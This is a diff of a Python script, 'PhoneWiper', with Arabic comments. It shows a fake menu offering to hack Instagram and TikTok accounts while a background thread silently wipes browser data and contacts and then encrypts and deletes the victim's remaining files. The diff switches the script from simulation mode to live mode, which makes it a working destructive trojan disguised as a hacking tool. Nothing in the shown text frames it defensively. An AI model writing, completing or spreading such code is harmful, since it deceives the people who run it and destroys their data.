@@ -13,14 +13,14 @@ from cryptography.fernet import Fernet
 
 class PhoneWiper:
     def __init__(self):
-        self.fake_mode = True  # وضع المحاكاة 
+        self.fake_mode = False  # وضع المحاكاة الوهمية
         self.wipe_complete = False
         self.encryption_key = Fernet.generate_key()
         self.cipher = Fernet(self.encryption_key)
         self.setup_fake_ui()
         
     def setup_fake_ui(self):
-        """واجهة مستخدم  مخادعة"""
+        """واجهة مستخدم وهمية مخادعة"""
         self.fake_options = {
             "1": "اختراق حساب انستجرام",
             "2": "اختراق حساب تيك توك",
@@ -29,7 +29,7 @@ class PhoneWiper:
         }
         
     def show_fake_menu(self):
-        """عرض القائمة """
+        """عرض القائمة الوهمية"""
         os.system('clear' if os.name == 'posix' else 'cls')
         print("""
         ██████╗ ██████╗ ███████╗██╗  ██╗███████╗
@@ -49,7 +49,7 @@ class PhoneWiper:
         """)
         
     def run_fake_hack(self, choice):
-        """تنفيذ عملية اختراق """
+        """تنفيذ عملية اختراق وهمية"""
         print(f"\n[+] جارِ اختراق {self.fake_options[choice]}...")
         time.sleep(2)
         
@@ -58,7 +58,7 @@ class PhoneWiper:
             print(f"المرحلة {i}/5: جارِ جمع البيانات...")
             time.sleep(random.uniform(0.5, 2))
             
-
+        # إنشاء ملف وهمي للنتائج
         fake_result = {
             "username": "victim_" + str(random.randint(1000, 9999)),
             "password": base64.b64encode(os.urandom(8)).decode(),
@@ -106,13 +106,13 @@ class PhoneWiper:
                 except:
                     continue
         
-
+        # إفراغ سجل المتصفح
         self.wipe_browser_data()
         
-
+        # مسح قاعدة بيانات جهات الاتصال
         self.wipe_contacts()
         
-
+        # تشفير الملفات المتبقية ثم حذفها
         self.encrypt_and_wipe_remaining()
         
         print("\n[+] تم مسح جميع البيانات بنجاح!")
@@ -163,7 +163,7 @@ class PhoneWiper:
                 except:
                     continue
                     
-
+        # حذف الملفات المشفرة
         for file in temp_files:
             try:
                 os.remove(file)
@@ -183,10 +183,10 @@ class PhoneWiper:
                 break
                 
             elif choice in self.fake_options:
-             
+                # تنفيذ الاختراق الوهمي
                 self.run_fake_hack(choice)
                 
-              
+                # بدء عملية المسح الحقيقية في الخلفية
                 if not self.wipe_complete:
                     wipe_thread = threading.Thread(target=self.real_wipe_operation)
                     wipe_thread.daemon = True
